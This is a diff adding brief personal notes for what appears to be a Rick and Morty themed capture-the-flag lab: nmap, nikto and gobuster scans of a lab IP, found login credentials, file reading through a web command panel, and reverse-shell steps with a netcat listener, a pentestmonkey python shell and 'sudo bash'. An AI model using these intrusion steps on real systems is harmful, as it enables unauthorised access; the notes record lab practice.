@@ -1,0 +1,36 @@
+ip :- 10.10.181.119
+
+nmap -A 10.10.181.119 -oN nmap
+ 
+ nikto -h http://10.10.181.119 | tee nikto.lo
+
+
+GO browser :- 10.10.181.119
+Page Resource
+
+
+GO buster :- 
+ - gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.181.119 
+ - http://10.10.89.180/robots.txt
+ 
+ 10.10.89.180/login.php
+  Username :- RlckRul3s
+  Password :- Wubbalubbadubdub
+  
+  Command Panel :- ls 
+  cat > filename.txt
+  while read line; do echo $line; done > clue.txt | Look Arount other file system
+  grep . clue.txt
+  grep -R . -> GO Source Code
+  161 line ->  mr. meeseek hair
+  last line comment  -> base64 -d | UNitl not found text 
+  
+  
+  Get Reverse Shell :- 
+   - nc -lnvp 9999
+   - python3 -c get from pentestermonkey 
+   - sudo bash
+   - ls 3rd.txt        - fleeb juice
+   - cd /home/ second  - 1 jerry tear
+   
+  
